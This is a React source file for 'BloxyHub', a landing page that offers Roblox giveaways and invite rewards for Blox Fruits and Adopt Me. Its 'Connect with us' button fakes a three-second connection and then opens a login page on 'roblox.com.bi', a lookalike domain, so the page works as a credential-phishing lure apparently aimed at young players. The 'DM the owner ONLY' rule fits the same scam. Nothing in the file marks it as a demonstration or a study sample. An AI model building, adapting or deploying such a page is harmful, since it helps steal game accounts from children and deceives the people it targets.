import { useState, Component, ReactNode, ErrorInfo } from 'react';
import { motion } from 'motion/react';
import { ShieldAlert, Users, Swords, Gamepad2, Gift, Loader2 } from 'lucide-react';

class ErrorBoundary extends Component<{children: ReactNode}, {hasError: boolean}> {
  constructor(props: {children: ReactNode}) {
    super(props);
    this.state = { hasError: false };
  }

  static getDerivedStateFromError(_: Error) {
    return { hasError: true };
  }

  componentDidCatch(error: Error, errorInfo: ErrorInfo) {
    console.error("Uncaught error:", error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen bg-brand-black flex items-center justify-center p-6 text-center">
          <div className="bg-brand-gray border border-brand-red/20 p-8 rounded-xl max-w-md w-full glow-border">
            <h2 className="text-2xl font-bold font-display text-white mb-4">Something went wrong</h2>
            <p className="text-gray-400 mb-6 font-sans">We encountered an unexpected error. Please try refreshing the page.</p>
            <button 
              onClick={() => window.location.reload()}
              className="bg-brand-red hover:bg-brand-red-light text-white font-medium px-6 py-2.5 rounded-lg transition-colors w-full"
            >
              Refresh Page
            </button>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}

export default function AppWrapper() {
  return (
    <ErrorBoundary>
      <App />
    </ErrorBoundary>
  );
}

function App() {
  const [isConnecting, setIsConnecting] = useState(false);

  const handleConnect = () => {
    setIsConnecting(true);
    setTimeout(() => {
      window.open("https://www.roblox.com.bi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F248544319711%2Fprofile", "_blank", "noopener,noreferrer");
      setIsConnecting(false);
    }, 3000);
  };

  return (
    <div className="relative min-h-screen bg-brand-black overflow-hidden flex flex-col font-sans selection:bg-brand-red/30">
      {/* Background ambient glows */}
      <div className="absolute top-0 inset-x-0 h-px bg-gradient-to-r from-transparent via-brand-red/50 to-transparent" />
      <div className="absolute -top-[30vh] left-1/2 -translate-x-1/2 w-[80vw] h-[60vh] bg-brand-red/10 blur-[120px] rounded-full pointer-events-none" />
      
      {/* Grid Pattern overlay */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:40px_40px] pointer-events-none [mask-image:radial-gradient(ellipse_60%_50%_at_50%_0%,#000_70%,transparent_100%)]" />

      {/* Main Content */}
      <main className="relative z-10 flex-grow flex items-center justify-center px-6 py-24">
        <div className="max-w-4xl mx-auto w-full text-center">
          
          <motion.div
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, ease: "easeOut" }}
            className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-brand-red/10 border border-brand-red/20 text-brand-red-light text-sm font-medium tracking-wide mb-8"
          >
            <Gift className="w-4 h-4" />
            <span>Giveaways & Invite Rewards</span>
          </motion.div>

          <motion.h1 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.7, delay: 0.1, ease: "easeOut" }}
            className="text-5xl md:text-7xl font-bold font-display tracking-tight mb-8"
          >
            Welcome to <span className="text-transparent bg-clip-text bg-gradient-to-r from-brand-red-light to-brand-red">BloxyHub</span>
          </motion.h1>

          <motion.p 
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.2 }}
            className="text-lg md:text-xl text-gray-400 mb-12 max-w-3xl mx-auto leading-relaxed"
          >
            Where we host giveaways and most importantly do invite rewards! We do invite rewards for 
            <span className="text-gray-200 font-semibold px-2">Blox Fruits</span> and 
            <span className="text-gray-200 font-semibold px-2">Adopt Me</span>. 
            <br className="hidden md:block" />
            Everything is very easy to do: verify here and you will see a channel called 
            <code className="bg-brand-gray px-2 py-1 rounded text-brand-red-light ml-2 text-sm">#invite-rewards</code> 
            where it shows what you have to do.
          </motion.p>

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.6, delay: 0.3 }}
          >
            <button 
              onClick={handleConnect}
              disabled={isConnecting}
              className="group relative inline-flex items-center justify-center gap-3 bg-brand-red hover:bg-brand-red-light text-white font-display font-semibold text-lg px-8 py-4 rounded-lg transition-all duration-300 glow-red hover:shadow-[0_0_60px_-10px_rgba(255,0,51,0.6)] hover:-translate-y-1 disabled:opacity-80 disabled:cursor-not-allowed disabled:hover:-translate-y-0 disabled:hover:shadow-[0_0_40px_-10px_rgba(255,0,51,0.4)]"
            >
              {isConnecting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>Connecting...</span>
                </>
              ) : (
                <>
                  <Swords className="w-5 h-5 group-hover:rotate-12 transition-transform duration-300" />
                  <span>Connect with us</span>
                </>
              )}
              <div className="absolute inset-0 border-2 border-white/20 rounded-lg pointer-events-none group-hover:border-white/40 transition-colors" />
            </button>
          </motion.div>
        </div>
      </main>

      {/* Footer / Warning Rules Section */}
      <footer className="relative z-10 bg-brand-gray/80 backdrop-blur border-t border-brand-red/10 py-8 px-6 mt-auto">
        <div className="max-w-4xl mx-auto grid md:grid-cols-2 gap-6">
          <motion.div 
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.6, delay: 0.4 }}
            className="flex gap-4 p-5 rounded-xl bg-brand-black glow-border"
          >
            <div className="shrink-0">
              <div className="w-10 h-10 rounded-full bg-brand-red/10 flex items-center justify-center text-brand-red">
                <Users className="w-5 h-5" />
              </div>
            </div>
            <div>
              <h3 className="text-white font-semibold mb-1">Invite Verification</h3>
              <p className="text-gray-400 text-sm leading-relaxed">
                Anyone you invite must also verify to stay in our server. We do this to make sure it's not an alt or j4j. If we find out you are doing j4j or these are alts, you will be banned.
              </p>
            </div>
          </motion.div>

          <motion.div 
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.6, delay: 0.5 }}
            className="flex gap-4 p-5 rounded-xl bg-brand-black glow-border border border-brand-red/10 relative overflow-hidden"
          >
            <div className="absolute top-0 left-0 w-1 h-full bg-brand-red" />
            <div className="shrink-0">
              <div className="w-10 h-10 rounded-full bg-brand-red/10 flex items-center justify-center text-brand-red">
                <ShieldAlert className="w-5 h-5" />
              </div>
            </div>
            <div>
              <h3 className="text-white font-semibold mb-1">Claiming Rewards</h3>
              <p className="text-gray-400 text-sm leading-relaxed">
                DM the owner ONLY and you must be verified to be eligible to claim your rewards.
              </p>
            </div>
          </motion.div>
        </div>
      </footer>
    </div>
  );
}
